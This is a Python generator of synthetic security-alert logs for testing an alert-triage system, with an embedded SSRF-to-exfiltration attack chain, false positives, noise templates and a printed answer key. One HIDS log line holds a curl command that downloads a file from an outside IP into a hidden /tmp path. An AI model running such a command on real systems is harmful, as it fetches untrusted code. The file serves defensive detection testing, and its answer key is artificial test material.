#!/usr/bin/env python3
"""生成多源安全告警测试数据，内嵌一条真实攻击链（SSRF → 内网 → 拿权限 → 横向 → 数据外带）。

raw 字段是「真 log 格式」：每类设备各自的 key=value / JSON 结构，把可疑/正常描述塞进
msg 字段（mock 杏仁核靠关键词命中 msg，真实模型直接读整段 log）。不再是纯自然语言摘要。

内嵌攻击链（7 条，跨 5 个设备源，凌晨 02:14–02:44）：
   1. 天眼       SSRF 入口探测（外网开放平台打内网云元数据）
   2. 天眼       SSRF 命中内网 Redis（未授权）
   3. 云审计     窃取服务账号凭证
   4. 堡垒机     svc_deploy 异常登录跳板机
   5. HIDS       提权 + 反弹 shell
   6. 数据库审计  横向登录数据服务器 + 批量查询
   7. DLP        数据外带（外网 IP + OSS 桶）

其余为多设备噪声，分三档（演示抑制梯度）：
   - clean：零特征（mock 置信度 0.15 → 直接抑制）
   - mild ：单特征（置信度 ~0.40–0.50 → 仍被抑制，但留痕可研判）
   - fp   ：双特征但实为误报（上板、不顶出，演示免疫耐受回写）

用法：
    python3 gen_attack_data.py                 # 生成 data/attack-day.jsonl（1000 条）
    python3 gen_attack_data.py --n 500 --out /tmp/x.jsonl
    python3 gen_attack_data.py --seed 42       # 换种子

攻击链实体刻意避开历史残留（tolerance.json / innate_rules.json 里的 svc_backup 等），
用全新段 10.20.0.0/16 + svc_deploy，否则会被免疫层当成「已知」静默，测不出新攻击。
"""
from __future__ import annotations

import argparse
import json
import os
import random

# ---------------------------------------------------------------------------
# 攻击链（固定 7 条）。raw 是真 log 格式（key=value），msg 里命中 ≥2 个 mock 关键词，
# 使 mock 置信度 ≥0.55（越过「正常」档抑制线），上板后靠共享实体拼成一条链。
# ---------------------------------------------------------------------------
ATTACK_CHAIN = [
    {"time": "02:14:07", "source": "天眼(全流量)", "asset": "web-mall-01", "type": "流量",
     "raw": 'src=10.20.1.10 dst=169.254.169.254 proto=http port=80 sig=ssrf sev=high msg="web-mall-01 向陌生内网地址发起请求，疑似 SSRF 绕过 WAF 探测云元数据服务，来源 mall-portal.example.com"'},
    {"time": "02:14:31", "source": "天眼(全流量)", "asset": "web-mall-01", "type": "流量",
     "raw": 'src=10.20.1.10 dst=10.20.2.20 port=6379 proto=tcp sig=redis sev=high msg="web-mall-01 经 SSRF 访问内部 redis-cache-02 写入陌生配置，疑似 Redis 未授权绕过"'},
    {"time": "02:15:02", "source": "云审计", "asset": "svc_deploy", "type": "身份",
     "raw": 'event=assume user=svc_deploy src=10.20.1.10 msg="服务账号凭证被陌生会话调用，疑似元数据泄露导致权限变更"'},
    {"time": "02:21:44", "source": "堡垒机", "asset": "svc_deploy", "type": "登录",
     "raw": 'user=svc_deploy src=10.20.1.10 dst=10.20.3.30 action=login msg="服务账号凌晨异常登录 ops-jump-02，命中异常登录特征"'},
    {"time": "02:23:17", "source": "HIDS", "asset": "ops-jump-02", "type": "进程",
     "raw": 'host=ops-jump-02 event=exec exe=/usr/bin/curl argv="curl -o /tmp/.k http://185.199.108.153/x" user=svc_deploy msg="svc_deploy 服务账号进程提权，写入隐藏文件并回连陌生地址"'},
    {"time": "02:31:28", "source": "数据库审计", "asset": "svc_deploy", "type": "数据库",
     "raw": 'user=svc_deploy db=orders src=10.20.3.30 dst=10.20.4.40 sql="SELECT * FROM customers" rows=412000 action=export msg="服务账号横向登录 db-order-01 并触发批量导出"'},
    {"time": "02:44:51", "source": "DLP", "asset": "db-order-01", "type": "数据",
     "raw": 'src=10.20.4.40 dst=185.199.108.153 bytes=4.2GB file=orders.csv action=upload msg="向陌生外网地址上传客户订单数据，命中批量导出特征，同时写入 OSS 桶 data-export-oss"'},
]

# ---------------------------------------------------------------------------
# 误报（6 条）——双特征、上板但不顶出（置信度 < 0.75），语义是合规/例行行为，
# 供分析师标记 False Positive → 回写免疫耐受，演示「越用越准」。
# ---------------------------------------------------------------------------
FALSE_POSITIVES = [
    {"time": "09:12", "source": "天眼(全流量)", "asset": "web-14", "type": "流量",
     "raw": 'src=10.10.5.14 sig=scan sev=low msg="内部合规扫描器 svc_scan 服务账号的异常登录行为，经确认为例行安全扫描"'},
    {"time": "10:03", "source": "WAF", "asset": "10.10.0.200", "type": "流量",
     "raw": 'src=10.10.0.200 rule=scan action=block msg="陌生扫描流量，尝试绕过，实为内部渗透测试平台授权扫描"'},
    {"time": "14:22", "source": "DLP", "asset": "dba_chen", "type": "数据",
     "raw": 'user=dba_chen action=export file=report.xlsx msg="季度财务例行批量导出，已报备合规"'},
    {"time": "16:47", "source": "堡垒机", "asset": "ops_wang", "type": "登录",
     "raw": 'user=ops_wang action=login msg="服务账号异常登录告警，实为值班运维轮班"'},
    {"time": "18:35", "source": "云审计", "asset": "svc_ci", "type": "身份",
     "raw": 'user=svc_ci event=config msg="svc_ci 服务账号的权限变更，属 CI/CD 流水线例行授权"'},
    {"time": "21:10", "source": "天眼(全流量)", "asset": "probe-01", "type": "流量",
     "raw": 'src=10.10.9.9 action=upload msg="向陌生外网地址发起长连接并批量导出状态，确认为第三方监控探针回连"'},
]

# ---------------------------------------------------------------------------
# 设备源 + 良性噪声模板。raw 用真 log 格式（key=value），asset 由 asset_key 显式指定。
# 约束：msg 不命中任何 mock 关键词（见 llm._INDICATORS），避免误上板。
# 字段名全部用单单词（src/dst/event/user/msg…），避免被实体抽取器当成带连字符的标识符。
# ---------------------------------------------------------------------------
HOSTS = (
    [f"web-{i:02d}" for i in range(1, 41)]
    + [f"app-{i:02d}" for i in range(1, 31)]
    + [f"db-{i:02d}" for i in range(1, 21)]
    + [f"cache-{i:02d}" for i in range(1, 11)]
    + [f"worker-{i:02d}" for i in range(1, 11)]
    + ["cron-srv", "log-srv", "mq-01", "gateway-01", "front-01", "batch-01", "report-01"]
)
ACCOUNTS = [
    "ops_zhang", "ops_li", "dev_wang", "dev_zhao", "qa_liu", "dba_chen", "dba_sun",
    "net_huang", "sec_admin", "svc_monitor", "backup_op", "deploy_bot", "ci_runner",
    "ops_wang", "ops_liu", "analyst_zhou", "analyst_wu",
]
# 良性用 10.10.0.0/16 与 172.16.0.0/16，刻意避开攻击链的 10.20.0.0/16。
BENIGN_PREFIXES = ("10.10.", "172.16.")


def _rand_ip(rng: random.Random) -> str:
    prefix = rng.choice(BENIGN_PREFIXES)
    return f"{prefix}{rng.randint(0, 255)}.{rng.randint(0, 255)}"


# (source, type, asset_key, raw_template, weight)
CLEAN_TEMPLATES = [
    ("天眼(全流量)", "流量", "host", 'src={ip} dst={ip2} proto=tcp bytes=2048 msg="{host} 访问正常业务域名，流量平稳"', 12),
    ("天眼(全流量)", "流量", "host", 'src={ip} dst={ip2} proto=tcp bytes=4096 msg="{host} 与 {host2} 正常数据传输，速率平稳"', 8),
    ("HIDS", "心跳", "host", 'host={host} event=beat msg="终端心跳正常，进程列表无变化"', 10),
    ("HIDS", "文件", "host", 'host={host} event=exec exe=/usr/bin/cron argv=/backup.sh msg="计划任务正常执行"', 6),
    ("HIDS", "补丁", "host", 'host={host} event=update msg="补丁更新完成"', 4),
    ("WAF", "流量", "ip", 'src={ip} uri=/ rule=whitelist action=allow msg="放行门户正常请求"', 8),
    ("WAF", "流量", "ip", 'src={ip} action=block rule=scan msg="拦截常规端口扫描"', 5),
    ("堡垒机", "登录", "account", 'user={account} dst={ip} action=login msg="正常登录 {host}，运维会话开始"', 8),
    ("堡垒机", "命令", "account", 'user={account} dst={ip} action=cmd msg="在 {host} 执行例行巡检命令"', 5),
    ("EDR", "心跳", "host", 'host={host} event=beat msg="终端在线，安全状态正常"', 6),
    ("EDR", "软件", "host", 'host={host} event=install msg="正常安装软件更新"', 3),
    ("云审计", "配置", "account", 'user={account} event=config msg="正常变更安全组，属白名单配置变更"', 5),
    ("云审计", "登录", "account", 'user={account} event=login msg="正常登录云控制台"', 4),
    ("DLP", "邮件", "account", 'user={account} action=send msg="发送正常邮件，未命中敏感数据规则"', 4),
    ("DLP", "打印", "account", 'user={account} action=print msg="打印文档，未含敏感信息"', 2),
    ("邮件网关", "邮件", "account", 'from={account} action=deliver msg="拦截垃圾邮件"', 4),
    ("邮件网关", "邮件", "account", 'from={account} action=deliver msg="正常放行内部邮件"', 3),
    ("防火墙", "流量", "ip", 'src={ip} action=allow rule=egress msg="放行正常出站流量"', 6),
    ("VPN", "登录", "account", 'user={account} action=connect msg="正常建立远程连接"', 4),
    ("数据库审计", "查询", "account", 'user={account} db=prod sql="SELECT" rows=10 msg="执行慢查询，属正常业务查询"', 5),
    ("数据库审计", "备份", "account", 'user={account} db=prod action=backup msg="例行备份任务完成"', 4),
    ("蜜罐", "扫描", "ip", 'src={ip} action=detect msg="检测到端口扫描，来自公网扫描器"', 3),
    ("AD域控", "认证", "account", 'user={account} event=pwd msg="修改密码成功，属于正常流程"', 3),
]

# 单特征模板（mild）——msg 只命中一个 mock 关键词，置信度 < 0.55，仍被抑制但留痕。
MILD_TEMPLATES = [
    ("天眼(全流量)", "流量", "ip", 'src={ip} dst={ip2} msg="{host} 向陌生公网 IP 发起探测连接"', 5),      # 陌生
    ("DLP", "数据", "account", 'user={account} action=export msg="导出一份公开文档，未含敏感数据"', 4),     # 导出
    ("云审计", "配置", "account", 'user={account} event=sync msg="将日志同步到 OSS 存储桶，属例行归档"', 4),  # oss
    ("堡垒机", "登录", "account", 'user={account} action=login msg="使用服务账号登录，正常运维会话"', 4),     # 服务账号
    ("天眼(全流量)", "流量", "ip", 'src={ip} msg="{host} 触发 mfa 验证，验证通过"', 4),                   # mfa
    ("云审计", "配置", "account", 'user={account} event=config msg="例行权限变更，已报备"', 4),             # 权限变更
    ("DLP", "数据", "account", 'user={account} action=upload msg="上传文件至 OSS 桶，属常规发布"', 4),      # oss
    ("堡垒机", "登录", "account", 'user={account} action=login msg="异常登录告警，实为本人异地出差"', 4),    # 异常登录
    ("数据库审计", "备份", "account", 'user={account} action=backup msg="备份任务晚跑 40 分钟"', 4),        # 晚跑
    ("AD域控", "认证", "account", 'user={account} event=login msg="登录三个月没碰过的测试机"', 4),           # 三个月没碰
]


def _ctx(rng: random.Random) -> dict:
    return {"host": rng.choice(HOSTS), "ip": _rand_ip(rng), "account": rng.choice(ACCOUNTS),
            "host2": rng.choice(HOSTS), "ip2": _rand_ip(rng)}


def _minutes(t: str) -> int:
    parts = t.split(":")
    return int(parts[0]) * 60 + int(parts[1])


def _rand_time(rng: random.Random) -> str:
    m = rng.randint(0, 23 * 60 + 59)
    return f"{m // 60:02d}:{m % 60:02d}"


def _from_tpl(tpl, time: str, rng: random.Random) -> dict:
    source, type_, asset_key, raw_tpl, _weight = tpl
    ctx = _ctx(rng)
    return {"time": time, "source": source, "asset": ctx.get(asset_key, ""), "type": type_,
            "raw": raw_tpl.format(**ctx)}


def generate(n: int, seed: int) -> list[dict]:
    rng = random.Random(seed)
    signals: list[dict] = list(ATTACK_CHAIN) + list(FALSE_POSITIVES)

    n_mild = n // 20
    n_clean = max(0, n - len(signals) - n_mild)

    clean_weights = [w for *_, w in CLEAN_TEMPLATES]
    mild_weights = [w for *_, w in MILD_TEMPLATES]

    for _ in range(n_clean):
        tpl = rng.choices(CLEAN_TEMPLATES, weights=clean_weights)[0]
        signals.append(_from_tpl(tpl, _rand_time(rng), rng))
    for _ in range(n_mild):
        tpl = rng.choices(MILD_TEMPLATES, weights=mild_weights)[0]
        signals.append(_from_tpl(tpl, _rand_time(rng), rng))

    # 按时间排序（攻击链与噪声自然交织）
    signals.sort(key=lambda s: (_minutes(s["time"]), s["time"]))
    return signals


def main() -> None:
    ap = argparse.ArgumentParser(description="生成内嵌攻击链的多源告警测试数据（真 log 格式）")
    ap.add_argument("--n", type=int, default=1000, help="总条数（默认 1000，含 7 攻击 + 6 误报）")
    ap.add_argument("--seed", type=int, default=20260815)
    ap.add_argument("--out", default=os.path.join(os.path.dirname(__file__), "data", "attack-day.jsonl"))
    args = ap.parse_args()

    if args.n < len(ATTACK_CHAIN) + len(FALSE_POSITIVES) + 1:
        raise SystemExit(f"--n 至少 {len(ATTACK_CHAIN) + len(FALSE_POSITIVES) + 1}")

    sigs = generate(args.n, args.seed)
    out = args.out
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        for s in sigs:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")

    from collections import Counter
    by_src = Counter(s["source"] for s in sigs)
    print(f"已生成 {len(sigs)} 条 → {out}")
    print(f"设备源分布：")
    for src, c in by_src.most_common():
        print(f"  {src:10s} {c}")
    print("\n内嵌攻击链（7 条，答案键）：")
    for s in ATTACK_CHAIN:
        print(f"  [{s['time']}] {s['source']} · {s['asset']} · {s['type']}")
    print(f"\n内嵌误报（{len(FALSE_POSITIVES)} 条，上板不顶出，供标记 False Positive）：")
    for s in FALSE_POSITIVES:
        print(f"  [{s['time']}] {s['source']} · {s['asset']}")


if __name__ == "__main__":
    main()
